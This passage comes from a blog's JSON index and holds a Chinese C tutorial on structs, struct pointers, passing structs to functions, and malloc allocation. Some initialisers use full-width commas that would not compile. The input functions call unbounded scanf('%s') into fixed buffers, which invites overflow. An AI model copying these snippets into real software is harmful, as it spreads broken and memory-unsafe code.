publisher[40];\n&#125; book &#x3D; &#123;\n    &quot;书名&quot;，\n    &quot;作者&quot;,\n    48.8,\n    &#123;2022，12，12&#125;,\n    &quot;出版社&quot;\n&#125;;\n\nint main(void)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book.title);\n    printf(&quot;作者：%s\\n&quot;, book.author);\n    printf(&quot;售价：%.2f\\n&quot;, book.price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, book.date.year, book.date.month, book.date.day);\n    printf(&quot;出版社：%s\\n&quot;, book.publisher);\n\n    return 0;\n&#125;\n\n结构体数组· 第一种方法是在声明结构体的时候进行定义：\n&#x2F;&#x2F; struct 结构体名称\n&#x2F;&#x2F; &#123;\n&#x2F;&#x2F;     结构体成员;\n&#x2F;&#x2F; &#125; 数组名[长度];\n\n· 第二种方法是先声明一个结构体类型（比如上面的Book），再用此类型定义一个结构体数组：\n&#x2F;&#x2F; struct 结构体名称\n&#x2F;&#x2F; &#123;\n&#x2F;&#x2F;     结构体成员;\n&#x2F;&#x2F; &#125;;\n&#x2F;&#x2F; struct 结构体名称 数组名[长度];\n\n结构体指针struct Book * pt;\npt &#x3D; &amp;book;\n\n通过结构体指针访问结构体成员有两种方法：\n(*结构体指针).成员名\n结构体指针-&gt;成员名\n\n#include &lt;stdio.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125; book &#x3D; &#123;\n    &quot;书名&quot;，\n    &quot;作者&quot;,\n    48.8,\n    &#123;2022，12，12&#125;,\n    &quot;出版社&quot;\n&#125;;\n\nint main(void)\n&#123;\n    struct Book *pt;\n    pt &#x3D; &amp;book;\n\n    printf(&quot;书名：%s\\n&quot;, (*pt).title);\n    printf(&quot;作者：%s\\n&quot;, (*pt).author);\n    printf(&quot;售价：%.2f\\n&quot;, (*pt).price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, (*pt).date.year, (*pt).date.month, (*pt).date.day);\n    printf(&quot;出版社：%s\\n&quot;, (*pt).publisher);\n\n    return 0;\n&#125;\n\n传递结构体变量#include &lt;stdio.h&gt;\n\nint main(void)\n&#123;\n    struct Test\n    &#123;\n        int x;\n        int y;\n    &#125;t1, t2;\n\n    t1.x &#x3D; 3;\n    t1.y &#x3D; 4;\n\n    t2 &#x3D; t1;\n\n    printf(&quot;t2.x &#x3D; %d, t2.y &#x3D; %d \\n&quot;, t2.x, t2.y);\n\n    return 0;\n&#125;\n\n#include &lt;stdio.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125;;\n\nstruct Book getInput(struct Book book);\n\nstruct Book getInput(struct Book book)\n&#123;\n     printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book.title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book.author);\n    printf(&quot;请输入售价：&quot;);\n    scanf(&quot;%f&quot;, &amp;book.price);\n    printf(&quot;请输入出版日期：&quot;);\n    scanf(&quot;%d-%d-%d&quot;, &amp;book.date.year, &amp;book.date.month, &amp;book.date.day);\n    printf(&quot;请输入出版社：&quot;);\n    scanf(&quot;%s&quot;, book.publisher);\n\n    return book;\n&#125;\n\nvoid printBook(struct Book book);\n\nvoid printBook(struct Book book)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book.title);\n    printf(&quot;作者：%s\\n&quot;, book.author);\n    printf(&quot;售价：%.2f\\n&quot;, book.price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, book.date.year, book.date.month, book.date.day);\n    printf(&quot;出版社：%s\\n&quot;, book.publisher);\n&#125;\n\nint main(void)\n&#123;\n    struct Book b1,b2;\n\n    printf(&quot;请录入第一本书的信息...\\n&quot;);\n\n    b1 &#x3D; getInput(b1);\n\n    putchar(&#39;\\n&#39;);\n\n    printf(&quot;请输入第二本书的信息...\\n&quot;);\n\n    b2 &#x3D; getInput(b2);\n\n    printf(&quot;\\n\\n录入完毕，现在开始打印验证\\n\\n&quot;);\n\n    printf(&quot;打印第一本书的信息：&quot;);\n\n    printBook(b1);\n\n    printf(&quot;打印第二本书的信息：&quot;);\n\n    putchar(&#39;\\n&#39;);\n\n    printBook(b2);\n\n    return 0;\n&#125;\n\n\n传递指向结构体变量的指针· 一切为了效率\n\n#include &lt;stdio.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125;;\n\nvoid getInput(struct Book *book);\n\nvoid getInput(struct Book *book)\n&#123;\n     printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n    printf(&quot;请输入售价：&quot;);\n    scanf(&quot;%f&quot;, &amp;book-&gt;price);\n    printf(&quot;请输入出版日期：&quot;);\n    scanf(&quot;%d-%d-%d&quot;, &amp;book-&gt;date.year, &amp;book-&gt;date.month, &amp;book-&gt;date.day);\n    printf(&quot;请输入出版社：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;publisher);\n&#125;\n\nvoid printBook(struct Book *book);\n\nvoid printBook(struct Book *book)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n    printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n    printf(&quot;售价：%.2f\\n&quot;, book-&gt;price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, book-&gt;date.year, book-&gt;date.month, book-&gt;date.day);\n    printf(&quot;出版社：%s\\n&quot;, book-&gt;publisher);\n&#125;\n\nint main(void)\n&#123;\n    struct Book b1,b2;\n\n    printf(&quot;请录入第一本书的信息...\\n&quot;);\n\n    getInput(&amp;b1);\n\n    putchar(&#39;\\n&#39;);\n\n    printf(&quot;请输入第二本书的信息...\\n&quot;);\n\n    getInput(&amp;b2);\n\n    printf(&quot;\\n\\n录入完毕，现在开始打印验证\\n\\n&quot;);\n\n    printf(&quot;打印第一本书的信息：&quot;);\n\n    printBook(&amp;b1);\n\n    printf(&quot;打印第二本书的信息：&quot;);\n\n    putchar(&#39;\\n&#39;);\n\n    printBook(&amp;b2);\n\n    return 0;\n&#125;\n\n动态申请结构体使用malloc函数为结构体分配存储空间\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125;;\n\nvoid getInput(struct Book *book);\n\nvoid getInput(struct Book *book)\n&#123;\n     printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n    printf(&quot;请输入售价：&quot;);\n    scanf(&quot;%f&quot;, &amp;book-&gt;price);\n    printf(&quot;请输入出版日期：&quot;);\n    scanf(&quot;%d-%d-%d&quot;, &amp;book-&gt;date.year, &amp;book-&gt;date.month, &amp;book-&gt;date.day);\n    printf(&quot;请输入出版社：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;publisher);\n&#125;\n\nvoid printBook(struct Book *book);\n\nvoid printBook(struct Book *book)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n    printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n    printf(&quot;售价：%.2f\\n&quot;, book-&gt;price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, book-&gt;date.year, book-&gt;date.month, book-&gt;date.day);\n    printf(&quot;出版社：%s\\n&quot;, book-&gt;publisher);\n&#125;\n\nint main(void)\n&#123;\n    struct Book *b1,*b2;\n\n    b1 &#x3D; (struct Book *)malloc(sizeof(struct Book));\n    b2 &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (b1 &#x3D;&#x3D; NULL || b2 &#x3D;&#x3D; NULL)&#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    printf(&quot;请录入第一本书的信息...\\n&quot;);\n\n    getInput(b1);\n\n    putchar(&#39;\\n&#39;);\n\n    printf(&quot;请输入第二本书的信息...\\n&quot;);\n\n    getInput(b2);\n\n    printf(&quot;\\n\\n录入完毕，现在开始打印验证\\n\\n&quot;);\n\n    printf(&quot;打印第一本书的信息：\\n&quot;);\n\n    printBook(b1);\n\n    printf(&quot;打印第二本书的信息：\\n&quot;);\n\n    putchar(&#39;\\n&#39;);\n\n    printBook(b2);\n\n    free(b1);\n    free(b2);\n\n    return 0;\n&#125;","slug":"c语言_01","date":"2023-04-23T03:20:34.000Z","categories_index":"c语言基础","tags_index":"c语言基础","author_index":"南瓜の无名"}]